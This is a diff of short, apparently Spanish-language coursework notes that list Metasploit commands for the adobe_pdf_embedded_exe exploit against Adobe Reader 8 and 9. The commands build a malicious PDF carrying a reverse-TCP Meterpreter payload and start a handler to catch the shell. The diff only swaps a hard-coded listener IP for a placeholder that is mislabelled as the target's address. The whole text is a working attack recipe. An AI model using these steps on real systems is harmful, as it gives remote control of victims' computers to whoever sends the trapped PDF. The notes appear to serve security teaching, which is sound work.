@@ -10,15 +10,14 @@ Programas: Adobe Reader v8.x, v9.x <br />
 <br />
 use exploit/windows/fileformat/adobe_pdf_embedded_exe <br />
 set payload windows/meterpreter/reverse_tcp <br />
-ifconfig <br />
-set lhost 10.191.3.4 <br />
+set lhost <ip_maquina_a_atacar> <br />
 set lport 4444 <br />
 set infilename /root/parcial/el_gigante_egoista.pdf <br />
 exploit <br />
 <br />
 back <br />
 use exploit/multi/handler <br />
-set lhost 10.191.3.4 <br />
+set lhost <ip_maquina_a_atacar> <br />
 set lport 4444 <br />
 exploit <br /> 
 <br />
